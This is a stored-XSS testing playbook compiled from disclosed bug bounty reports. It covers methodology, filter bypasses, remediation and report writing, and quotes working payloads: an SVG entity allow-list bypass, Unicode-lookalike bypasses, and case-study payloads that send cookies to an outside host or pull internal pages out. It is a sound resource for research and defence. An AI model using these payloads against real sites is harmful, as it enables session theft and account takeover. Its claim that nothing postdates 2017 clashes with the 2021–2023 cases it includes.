---
title: "Stored Cross-Site Scripting (XSS)"
type: playbook
category: stored-xss
cwe: "CWE-79"
source_count: 154
full_bodies_available: 127
summary_only: 27
archive_accessed: 2026-10-12
---

# Stored XSS

## 1. Overview

A stored XSS exists when attacker input is persisted by the application and later
rendered, unneutralised, to **other** users. It is the highest-impact member of the
XSS family because it needs no victim interaction beyond the victim visiting an
ordinary page: no link to click, no crafted URL, no unusual user agent.

The archive's stored-XSS reports cluster into three shapes, and the shape — not the
payload — determines what a good report looks like:

1. **Self-service stored XSS** — any low-privilege user writes to a field that is
   rendered to other users (profile names, comments, app names, enhancement names).
   The escalation path is privilege: attacker writes, a more privileged user views.
2. **Stored XSS into a privileged console** — the payload fires in an admin panel.
   Highest severity in the class. `STOR-074` (Uber Newsroom, `$5,000`) is the anchor
   case.
3. **Stored XSS carried across a trust boundary** — the persisted value is later
   served to a *different origin* or executed in a *different principal's* session
   (embedded app in an admin frame, shared project, third-party embed). These have a
   distinct methodology because the tester must trace where the stored bytes end up.

## 2. Root Cause and Technical Mechanics

The universal flow:

```
attacker stores payload  →  storage  →  some other user loads page
                         →  template/JS renders without context-correct encoding
                         →  script runs as the viewer
```

Every one of these is the *same* root cause as reflected XSS — missing or
context-mismatched output encoding at the render step. What changes is the
**persistence** and the **victim set**.

### 2.1 The write path is rarely the bug

In nearly every report in this archive, the researcher could store arbitrary bytes
without resistance. The defect is consistently on the **read/render** path. This is
why stored-XSS testing must always include a second account:

> Store as user A → view as user B → observe execution as B.

`STOR-146` (Mixmax) makes the escalation explicit: the attacker creates an
enhancement, **shares it with another user or team**, and the payload fires when the
recipient accepts it and is redirected back to the integrations page.

### 2.2 Privilege escalation is the impact story

`STOR-074` (Uber Newsroom) is the clearest example in the archive. An
**unauthenticated** user triggers a WordPress `wp_redirect()` hook; the Stream plugin
logs the URL unescaped into the admin activity log; when an administrator opens the
dashboard, the script executes **with administrator privileges** — and the reporter
noted this "can (under normal setup) be further used to inject attacker-supplied PHP
code on the server."

The reporter's supplied reproduction is a single unauthenticated `curl` command with a
spoofed `Referer` carrying the payload. No login, no user interaction, no victim link.

### 2.3 Filter failures specific to stored content

`STOR-142` and `STOR-143` (both Rockstar, both `$1,000`, both medium) are a matched
pair, and the team's own summaries are the best blocklist-failure documentation in
this knowledge base:

- **STOR-142** (Snapmatic comments): *"we were not filtering **＜** and **＞**
  characters the same as `<` and `>`."*
- **STOR-143** (Profile activity feed): *"certain obscure characters were not being
  converted to HTML entities properly."* The disclosed exploit string was
  `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`.

The lesson: fullwidth / obscure Unicode lookalikes for `<`, `>`, `"` are a standing
test input for any filter doing character-level matching. See
[`Filter-Bypass-and-Encoding.md`](Filter-Bypass-and-Encoding.md).

## 3. Attack Surface and Preconditions

Where stored payloads live in this archive:

| Surface | Case | Note |
| --- | --- | --- |
| Comments | `STOR-142`, `STOR-014` (Nextcloud self-XSS in comment edit) | UGC, high volume |
| Profile / display names | `STOR-105`, `STOR-045`, `CONT-035` | rendered in many places |
| Activity feeds / logs | `STOR-143`, `STOR-074` | read by admins |
| Application names | `STOR-105` (Slack) | rendered on a path derived from the name |
| Feature/config labels | `STOR-146`, `STOR-147` (Mixmax), `STOR-035` (Shopify Buy Button) | low-privilege write, high-privilege read |
| Uploaded content | `STOR-144` (Shopify SVG icon), `FILE-*` | see [`File-Upload-and-SVG-XSS.md`](File-Upload-and-SVG-XSS.md) |
| Template / map attributes | `STOR-045` (Mapbox attribution), `CONT-095` (Mapbox share) | rendered into third-party pages |
| Third-party embeds | `STOR-045`, `CONT-126` | see [`Browser-Extension-and-Messaging-XSS.md`](Browser-Extension-and-Messaging-XSS.md) |

**Preconditions.** Usually: a registered account (sometimes any authenticated user,
sometimes a specific role). Rarely: an admin account, because the whole point is that
an ordinary account suffices. Always: **a second principal who views the stored value.**

## 4. Manual Testing Methodology

1. **Pick low-privilege write fields.** Profile names, comments, org/team labels,
   file metadata, "add integration" forms. Anything a normal user can write.
2. **Store a marker first.** `H1XSSSTORED9`. Load the page as the *author*. If the
   marker is escaped everywhere you can see, you may only have an HTML-injection or
   self-XSS bug, not stored XSS.
3. **Log out. Log in as user B.** Never conclude from the author's own view. In this
   archive, self-XSS findings were filed separately and were treated as a different
   class — see [`Self-XSS.md`](Self-XSS.md).
4. **Trace every render site.** A value escaped in the profile page may be unescaped in
   the activity feed, the admin panel, an export, or a notification email. Grep the
   stored value across the app. `STOR-146` found the same bug in "Social Badges"
   (`STOR-147`) *after* it had been accepted in a sibling feature — the reporter noted
   the analogous section "are not accepting this payload," i.e. a **per-widget**
   inconsistency.
5. **Enumerate sibling features explicitly.** `STOR-146`/`STOR-147` are one root cause
   found twice because the reporter tested the adjacent widget. Do this deliberately.
6. **Escalate the impact claim by naming the viewer.** "Stored XSS" is weak. "Stored
   XSS executing in the admin panel when an administrator views the activity log" is a
   severity.
7. **For cross-boundary cases, follow the bytes off-origin.** If a value is stored and
   served to another origin, demonstrate it there.

## 5. Input and Output Context Analysis

Stored XSS obeys exactly the same context rules as
[`Reflected-XSS.md`](Reflected-XSS.md) §5, but the observed contexts in this archive
skew differently — toward attribute and URL contexts, because display names are
routinely interpolated into `title=`, `alt=`, `href=` and avatar URLs:

| Observed context | Case | Break-out |
| --- | --- | --- |
| Unquoted/quoted HTML attribute | `STOR-146`, `STOR-035`, `STOR-105` | `"><img src=x onerror=...>` |
| Path segment derived from user input | `STOR-105` (Slack app name) | `"/><script>alert(/Bhati/)</script>` |
| `href` / URL attribute | `STOR-147` (Mixmax social badge URL) | `javascript:alert(1)` |
| HTML text in a third-party template | `STOR-045` (Mapbox attribution) | `"><img src=x onerror=...>` |
| Admin log viewer | `STOR-074` | unescaped log line |
| XML/SVG attribute allow-list | `STOR-144` | `<!ENTITY>` + `onload` |

`STOR-045` deserves a note because its impact is *wider than the reporting origin*.
The Mapbox team summary states it allowed "the execution of arbitrary JavaScript in
websites using Mapbox.js with the uncommon usage scenario of loading untrusted
TileJSON" — so the stored value left mapbox.com and executed on third-party sites.

## 6. Test Cases and Proof-of-Concepts

### 6.1 Historical payloads (verbatim from the cited reports)

Historical. Understand them; do not reuse them against live targets.

| Case | Report | Field | Payload as submitted |
| --- | --- | --- | --- |
| STOR-142 | `231389` | Snapmatic comments | Unicode-lookalike `<` `>` bypass (filter detail in team summary) |
| STOR-143 | `231444` | Profile activity feed | `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€` |
| STOR-146 | `237100` | Enhancement name | `"><img src=x onerror=alert(document.domain)>` |
| STOR-147 | `238906` | Social badge URL | `javascript:alert(1)` |
| STOR-105 | `159460` | Slack app `name` | `"/><script>alert(/Bhati/)</script>` |
| STOR-045 | `54327` | Mapbox attribution | `"><img src=x onerror=alert(document.cookie)>` |
| STOR-074 | `127948` | Referer on `postpass` | Referer containing `aaa%3cscript%3ealert('stored xss');%3c/script%3e` |

### 6.2 Newly authored illustrations (not from the archive)

Storage probe, in increasing strength:

```
H1XSSSTORED9                     → reflection as escaped text
"><h1>xss-marker                 → markup control
"><img src=x onerror=alert(1)>   → attribute/event-handler injection
javascript:alert(1)              → URL attribute (only where a URL field exists)
```

Unicode lookalike set — the standing test for any character-level filter. These are
the *codepoints* to test with, not advice to deploy them:

| Lookalike | Codepoint | Resembles |
| --- | --- | --- |
| ＜ FULLWIDTH LESS-THAN SIGN | U+FF1C | `<` |
| ＞ FULLWIDTH GREATER-THAN SIGN | U+FF1E | `>` |
| ″ DOUBLE PRIME | U+2033 | `"` |
| ＜/＞ fullwidth variant | U+FF1C / U+FF1E | as above |

`STOR-143` is the sourced confirmation that this exact class works: the payload mixed
`† ‡ • ‰ €` with fullwidth `＜`/`＞`.

**Safe proof.** Store a payload that reads `document.domain` or exfiltrates to a
collaborator endpoint rather than opening an alert. `STOR-045`'s PoC read
`document.cookie`; that is the minimum acceptable bar for a stored finding.

## 7. Encoding, Filtering, and Parsing Behavior

Three failure modes are documented in this archive, and each produces a distinct
bypass strategy:

| Failure | Case | Consequence |
| --- | --- | --- |
| Filter checks ASCII `<`/`>` only | `STOR-142` | Fullwidth `＜`/`＞` reach the template |
| Entity conversion misses obscure chars | `STOR-143` | Mixed Unicode payload survives |
| Allow-list bypassed by an unparsed construct | `STOR-144` | `<!ENTITY>` neutralises the SVG attribute allow-list, unmasking `onload` |

`STOR-144` (Shopify, `$5,000`, high) is the most interesting, because the filter was
*not* naive — Shopify enforces a documented SVG allow-list for app navigation icons,
per the report. But as the researcher established, *"when the SVG contains an XML
entity this whitelist is no longer enforced allowing the developer to include malicious
attributes such as `onload`."* An internal DTD entity declared in the SVG:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [ <!ENTITY elem ""> ]>
<svg onload="alert(document.domain);" height="16" width="16"> &elem; </svg>
```
The lesson generalises past SVG: **a parser-differential between the validator and the
renderer disables the allow-list.** Test validators with the constructs they may not
handle — DTDs, entities, CDATA, namespace prefixes, encoding declarations.

## 8. Impact and Severity Considerations

Stored XSS severity is set by **who views it** and **what that principal can do**.

| Report | Program | H1 severity | Bounty | Viewer |
| --- | --- | --- | --- | --- |
| `232174` STOR-144 | Shopify | high | $5,000 | store admin + partners.shopify.com |
| `231053` DOM-018 | Shopify | not disclosed | $3,000 | any visitor, any shop |
| `127948` STOR-074 | Uber Newsroom | not disclosed | $5,000 | site administrator |
| `231389` STOR-142 | Rockstar Games | medium | $1,000 | other users (UGC comments) |
| `231444` STOR-143 | Rockstar Games | medium | $1,000 | other users (activity feed) |
| `237100` STOR-146 | Mixmax | medium | not disclosed | invited recipient |
| `241008` STOR-* | Shopify | not disclosed | not disclosed | — |

**Calibration guidance.** The two Rockstar reports sit at `medium` / `$1,000` with a
plain UGC viewer. The Uber admin-panel report sits at `$5,000` because the execution
principal is an administrator with server-side consequences. That is a 5x difference
driven entirely by the viewer, not by the payload. State the viewer explicitly in every
stored-XSS report.

**Honest ceilings.** Where the viewing context has no valuable cookie, say so — the
`191380` researcher's *"ton.twitter.com has no valuable cookies at all"* is the model.
Claiming account takeover without a demonstrated path to credentials is the most
common over-claim in this class.

## 9. False Positives and Limitations

- **Self-XSS is not stored XSS.** If only the author can trigger it, it belongs in
  [`Self-XSS.md`](Self-XSS.md). `STOR-014` (Nextcloud, `$100`) was filed as *reflected
  self-XSS* for exactly this reason and paid accordingly.
- **Stored but inert ≠ stored XSS.** `HTML-010` (`198907`, VK.com) is the honest
  counter-example: the researcher stored markup that "will be parsed in that area, but
  after saving it, it won't parse," and **explicitly declined to claim XSS** — *"I'm
  still looking into this, as this could be a possible XSS vuln if I can find vectors."*
  Correct restraint, correctly categorised.
- **Per-widget inconsistency is not two bugs.** `STOR-146` and `STOR-147` are one root
  cause across sibling widgets; file them together with both reproductions.
- **Duplicates.** Several reports in this archive were explicitly filed as
  "similar to #NNNNNN" (`217745`: *"similar in impact, exploitability and root-cause as
  report #205701"*). Deduplicate, but preserve each citation.
- **Erasure testing.** A stored XSS claim is stronger if you confirm the payload is
  removed from storage on edit/delete. Note it if you test it.

## 10. Remediation and Regression Testing

### 10.1 Remediation

- **Encode on render, for every consumer.** Stored values have many read paths; a fix
  on one page does not fix the feed, the export, the email, or the API.
- **Prefer DOM construction** (`textContent`, `createElement`, `.value`) over string
  concatenation. This removes the context question entirely.
- **Constrain stored values at write time as defence in depth** — length, allowed
  charset, no control characters. Not a substitute for output encoding.
- **Revalidate the SVG allow-list against a parser that handles DTDs and entities**,
  or reject SVG entirely (see [`File-Upload-and-SVG-XSS.md`](File-Upload-and-SVG-XSS.md)).
- **Sanitise with an allow-list library** for rich-text fields, configured per context.
- **Review admin consoles specifically.** Log viewers and moderation queues are a
  recurring high-severity sink (`STOR-074`, `CONT-185`, `CONT-155`).
- **Do not rely on CSP** as the fix. It is defence in depth.

### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| Store a payload as user A; render as user B; assert escaped | cross-user rendering safe |
| Repeat for every render path found by grep (feed, admin, export, email) | all paths encoded |
| Store fullwidth `＜`/`＞` and U+2033 in the same field | filter handles Unicode |
| Store `<!DOCTYPE svg [<!ENTITY x "">]>` in any SVG-accepting field | validator handles DTD |
| Store `javascript:` in every URL-accepting field | scheme allow-list enforced |
| Delete the record; re-check every render path | payload gone from storage |
| Submit a benign payload, confirm app still works | no over-blocking |

## 11. Historical Bug Bounty Case Studies

Only sourced facts. Fields absent from the source are marked
**Not disclosed in the source.** Inventory:
[`references/source-index.md`](references/source-index.md).

---

### STOR-074 — Stored XSS on newsroom.uber.com admin panel / Stream WordPress plugin

- **Program:** Uber · **Report:** <https://hackerone.com/reports/127948>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Published:** 2016-04-03 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity:** Not disclosed in the source · **Bounty:** $5,000
- **Body inspected:** Yes — **full report**.

**Affected feature:** the Stream WordPress plugin's activity log, rendered in the
WordPress admin dashboard.

**Preconditions:** **none** — the report states *"An unauthenticated user can produce
such a log message to inject JavaScript in the admin panel."*

**Reproduction (as submitted):**
```
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' \
     --data 'post-password=foo' 'https://newsroom.uber.com/wp-login.php?action=postpass'
```
Then open the Stream tab in the WordPress Dashboard.

**Root cause (researcher's description):** *"the logged events aren't sanitized
properly and can contain HTML tags and JavaScript."* The reporter identified the exact
code path in `connectors/installer.php`: a `wp_redirect()` hook
(`callback_wp_redirect`) inspects redirect locations for the plugin editor and logs
them, passing the query string through unescaped.

**Impact as claimed:** *"When an administrator views the log, the script would be
evaluated with administrator privilegs and can (under normal setup) be further used to
inject attacker-supplied PHP code on the server."*

**Remediation:** Not disclosed in the source.

---

### STOR-142 — Stored XSS in snapmatic comments

- **Program:** Rockstar Games · **Report:** <https://hackerone.com/reports/231389>
- **Archive listing:** <https://h1.security.nathan.sx/rockstargames.html>
- **Published:** 2017-05-24 · **Weakness:** `Cross-site Scripting (XSS) - Stored`
- **Severity:** medium · **Bounty:** $1,000
- **Body inspected:** No — withheld. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> "In this report, the researcher found that we were not filtering **＜** and **＞**
> characters the same as `<` and `>`. This allowed the researcher to craft XSS POCs
> that bypassed our filters, particularly on UGC comments. We have updated our filters
> to amend this oversight."

- **Remediation (documented):** filters updated to handle fullwidth angle brackets.
- Reproduction payload, endpoint, and exact field: **Not disclosed in the source.**

---

### STOR-143 — Stored XSS in profile activity feed messages

- **Program:** Rockstar Games · **Report:** <https://hackerone.com/reports/231444>
- **Archive listing:** <https://h1.security.nathan.sx/rockstargames.html>
- **Published:** 2017-05-24 · **Weakness:** `Cross-site Scripting (XSS) - Stored`
- **Severity:** medium · **Bounty:** $1,000
- **Body inspected:** No — withheld. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> "The researcher was able to demonstrate a Stored XSS vulnerability in the Profile and
> Crew Feed endpoints. The exploit string worked because the researcher realized that
> certain obscure characters were not being converted to HTML entities properly. The
> exploit string was `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`. This
> behavior allowed the researcher to insert and run his own JavaScript.
>
> We were able to update our code to properly filter characters like the ones in the
> exploit string."

**Why it matters here:** the only fully published payload in the archive for a
Unicode-normalisation filter bypass, and a ready-made regression test string.

---

### STOR-146 / STOR-147 — Mixmax: enhancement name and social badge URL

- **Reports:** <https://hackerone.com/reports/237100> and
  <https://hackerone.com/reports/238906>
- **Archive listing:** <https://h1.security.nathan.sx/mixmax.html>
- **Published:** 2017-06-06 and 2017-06-11 · **Weakness (STOR-146):**
  `Cross-site Scripting (XSS) - Stored` · **Severity (STOR-146):** medium
- **Bounty:** Not disclosed in the source
- **Body inspected:** Yes — both **full reports**.

**STOR-146 — feature:** Settings → Integrations & API → *Add Enhancement* → **Name**
field on `app.mixmax.com`.

**Reproduction (as submitted):** enter `"><img src=x onerror=alert(document.domain)>`
in the Name field → add the enhancement → **click the share icon beside it** → share
with a user or team → the recipient receives an email → on accepting, they are
redirected to the integrations page and the payload fires.

**Impact mechanism:** the enhancement name crosses a **share boundary** into another
principal's session. This is the pattern that distinguishes a serious stored XSS from
a cosmetic one.

**STOR-147 — feature:** Templates → Enhance → **Social Badges** → any social button
URL. Payload `javascript:alert(1)`.

The reporter explicitly noted the **per-widget inconsistency**, verbatim: *"The similar
social sections in Call to Action button are not accepting this payload, so but this
is not fixed in Social Badges section."* That sentence is the practical argument for
enumerating sibling widgets — see §4 step 5.

---

### STOR-045 — Persistent XSS in map attribution

- **Program:** Mapbox · **Report:** <https://hackerone.com/reports/54327>
- **Archive listing:** <https://h1.security.nathan.sx/mapbox.html>
- **Published:** 2015-04-02 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity:** Not disclosed in the source · **Bounty:** $1,000
- **Body inspected:** Yes — **full report**.

**Affected feature:** the **Attribution** field of a custom style in Mapbox Studio.
Payload as submitted: `"><img src=x onerror=alert(document.cookie)>`.

**Reproduction (as submitted):** create a style → put the payload in the Attribution
field → upload → save a project using it → the project list page executes the payload.
The reporter also demonstrated that **sharing the project makes it fire for
non-account holders**, noting the code "will be already executed" but only *after*
sharing is the useful form of the bug.

**Team summary, verbatim:** the issue *"allowed a potential attacker to have full
control over a user's Mapbox.com session and execute arbitrary JavaScript commands.
It also allowed for the execution of arbitrary JavaScript in websites using Mapbox.js
with the uncommon usage scenario of loading untrusted TileJSON."*

**Why it matters here:** the stored value escapes the reporting origin and executes on
**third-party sites**. Treat every "paste your map here" embed as an XSS sink.

---

### STOR-144 — XSS via whitelist bypass in SVG icon for sales channel applications

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/232174>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Published:** 2017-05-26 · **Weakness:** `Cross-site Scripting (XSS) - Stored`
- **Severity:** high (author: Team) · **Bounty:** $5,000
- **Body inspected:** Yes — **full report**.

**Affected feature:** the "Navigation icon" upload for a **Sales Channel** app in the
Partners dashboard.

**Root cause (researcher):** Shopify limits the SVG to allowed elements and attributes
per its design guidelines, but *"when the SVG contains an XML entity this whitelist is
no longer enforced allowing the developer to include malicious attributes such as
`onload`."*

**PoC (as submitted):**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
```

**Impact as claimed:** *"By uploading a malicious SVG a developer can obtain XSS on
both partners.shopify.com, as well as any the admin panel of any shop which has
authorized the sales channel."*

**Preconditions:** a developer account able to create a Sales Channel app; for the
`$shop$.myshopify.com/admin/` target, that app must be authorised on a shop.

**Related:** [`File-Upload-and-SVG-XSS.md`](File-Upload-and-SVG-XSS.md).

---

### Supporting stored sources (full bodies retrieved)

- **STOR-105** `159460` — <https://hackerone.com/reports/159460> — Slack, `$1,000`.
  App `name` field; payload `"/><script>alert(/Bhati/)</script>`; notably the payload
  also **propagated into the app's URL path**, and the reporter confirmed *"Its also
  work on other user as well"* with a shareable victim link.
- **STOR-035** `186462` — <https://hackerone.com/reports/186462> — Shopify, `$500`.
  'Buy Button' page variant-title attribute, selector `div[@class='cart-permalink__preview-variant-title']`.

### FirstBlood hackevent cases (BugBountyHunter.com · 2021-2023)

A second, fully-retrieved evidence set: the disclosed FirstBlood live-hackevent reports
on BugBountyHunter.com. 106 of the 207 XSS-typed reports are stored XSS, all catalogued
in [`references/firstblood-index.md`](references/firstblood-index.md). Severity labels
are the event triage's; "FirstBlood ID" is the underlying seeded bug.

- **FB-078** — <https://www.bugbountyhunter.com/hackevents/report?id=78> — FirstBlood
  v1 (May 2021) · **P1 CRITICAL** · $1,500 shared with two collaborators
  (*"I'm splitting the 1500 bounty between three of you"*). Cancel-appointment
  hidden `message` parameter POSTed to `/api/ma.php`, rendered in
  `/drpanel/cancelled.php`. Filter journey quoted: *"most of the common ones are
  blocked"* →
  custom tag `<xss/…>` worked; `onfocus` was stripped — *"onfocusin, this event
  handler didn't get removed"*. Payload
  `"><xss/id="1"/tabindex="1"/style="font-size:%20100px"/autofocus/onfocusin="window.location.href='https://example.com?cookie='%2bdocument.cookie">`
  updated from 1-click to *"requires nothing to fire"* (`autofocus`). ATE proof:
  redirect lands on `?cookie=drps=e7340a3ab0c53934aa368ed55` and *"This cookie can be
  easily reused even if the admin securily logged out. This is because the cookie does
  not expire."* (sic); *"because cookies were not httpOnly, I went for stealing
  cookies as this is the easiest way of achieving account takeover!"*. Sibling reports
  on the same seeded bug: FB-082, FB-133, FB-189, FB-202, FB-208.
- **FB-051** — <https://www.bugbountyhunter.com/hackevents/report?id=51> — v1 ·
  **P2 High**. `fname`/`lname` on book-appointment; render site
  `/drpanel/drapi/query.php?aptid=…`. Filter map quoted: removes `<script`/`<svg` in
  normal form, certain attributes (e.g. `onerror`) and `alert` — hence
  `fname=box<script/x xlo="svg"&lname=src="http://…/su.js"/></script/x>` splits the tag
  across two concatenated fields; fires for the doctor opening the aptid, whose
  `document.cookie` is XHR'd out. Bonus finding: aptids enumerated via `/api/qa.php`
  (*"bruteforcing the id parameter"*, *"start from 56910000"*). Discretionary bounty
  despite duplication.
- **FB-610 / FB-678 / FB-694** — v2 · **P2 High** ×3 · FirstBlood ID 29.
  Upload-vaccination-proof flows log the **User-Agent header** and render it in the
  management portal (`/vaccination-manager/portal.php`) *without sanitisation*: the
  payload rides a header, not a file — `"><svg/onload=alert(document.domain)`
  (FB-610), `</td><script>alert(document.domain)</script>` (FB-678: table-cell
  breakout), `<script>alert(document.cookie)</script>` (FB-694). Seeded rationale
  (platform note): *"As this value typically can't be user controlled the developers
  did not think it was 'worth' preventing against XSS."* HttpOnly nuance, FB-610:
  *"As the cookies are signed as httpOnly, this is not possible to steal the cookies…
  However, with an XSS an attacker can perform unauthenticated actions on behalf of
  the victim i.e. Cross-Site Request Forgery."* FB-694 counters it: *"vaccination_manager
  Cookie has HttpOnly flag so not vulnerable to XSS, but drps session is still
  vulnerable."*
- **FB-1310 / FB-1320 / FB-1559** — v3 · **P1 CRITICAL** ×3 · FirstBlood ID 72.
  Site hint *"Login attempts will be logged"* → planted blind XSS in
  `username`/`password`; fires for staff on the internal dashboard
  `https://firstblood-helper.com/login_attempts.php?id=<n>`. Tooling (FB-1310):
  *"You can create Blind XSS payloads by self hosting XSS hunter or by using an
  account on https://xsshunter.com"* — six payload families supplied, incl.
  `<input onfocus=eval(atob(this.id)) id=<base64> autofocus>` and an `iframe srcdoc`
  variant; FB-1320's `video/source onerror` encodes the base64 tail as `&#61;&#61;`.
  Observed turnaround (FB-1559): *"I sent the payload on 10/12/2022 and received a
  notification on 11/12/2022, 13:00"* — *"visits it daily"*. FB-1559 escalates to an
  **internal gateway**: same-origin XHR fetches `/login_attempts.php?id=118120` and
  posts the page back out — *"use this like an SSRF/gateway to the dashboard by
  screenshotting/fetching each page on the internal side and sending it back to my
  end"* (the incremental `id` is itself an IDOR surface).

## 12. Professional Vulnerability Report Template

````markdown
# Stored XSS in <feature> executes in <viewer context>

## Summary
<One paragraph: the field any user can write, who views it, what the viewer can do.>

## Severity
<high|medium|low> — <name the viewing principal and the consequence.>

## Affected endpoint / feature
`https://<host>/<path>` · Field: `<field name>` · Program: <name>

## Vulnerability details
### Write path
<field, who can write it, any validation observed>

### Read path
<every render site, with URLs>

### Root cause
<encoding applied, and the context it fails to match>

## Proof of concept
### Step 1 — store (as low-privilege user A)
```
Field: <field name>
Value:  "><img src=x onerror=alert(1)>
```
> Saved successfully; no validation error.

### Step 2 — view as user B (different account)
```
GET https://<host>/<path>
Account: user B (role: <role>)
```
> `alert` fires as user B in origin <origin>.

### Step 3 — impact principal
> Payload executing in <admin panel | activity feed | ...> as <role>.

## Remediation
<output encoding per render site; consider sanitiser for rich text>

## Regression checks
<List every render path that must be re-tested.>
````

**Reporting discipline.** Always include the second-account view. Always name the
viewer. Test and disclose whether a CSP mitigates it. If the viewing context has no
valuable session, state that rather than implying account takeover.

## 13. References

- OWASP Cheat Sheet — Cross Site Scripting Prevention: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP — Cross Site Scripting Prevention Cheat Sheet (DOM): <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- OWASP — Input Validation: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP — File Upload Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html>
- DOMPurify (allow-list sanitiser): <https://github.com/cure53/DOMPurify>
- Reports cited: <https://hackerone.com/reports/127948>, <https://hackerone.com/reports/231389>,
  <https://hackerone.com/reports/231444>, <https://hackerone.com/reports/237100>,
  <https://hackerone.com/reports/238906>, <https://hackerone.com/reports/54327>,
  <https://hackerone.com/reports/232174>, <https://hackerone.com/reports/159460>,
  <https://hackerone.com/reports/186462>

## 14. Research Gaps and Further Investigation

- **`STOR-142` and `STOR-143` bodies withheld.** Their published summaries give the
  root cause and (for STOR-143) the payload, but not the endpoint or exact field. The
  full reports would let §7 be verified rather than inferred.
- **The `‹＜›` regression string is confirmed but untested here.** `STOR-143`'s
  payload mixes `† ‡ • ‰ €` with fullwidth brackets; which specific characters matter
  (versus which merely accompanied them) cannot be determined from the summary.
- **No modern sources.** Nothing in this playbook postdates 2017. Modern rich-text
  editors, sanitiser bypasses, and DOM-clobbering persistence are underrepresented.
- **Under-explored in the archive:** sanitiser-configuration bugs (allow-list too
  broad, e.g. allowing `<a href="javascript:...">`), mutation-XSS via DOM clobbering,
  and stored XSS surviving server-side sanitisation through re-serialisation.
- **Recommended follow-up:** for each reported field, determine whether the app
  sanitises on write, on read, or both — the archive rarely establishes which, and the
  answer changes the correct fix.
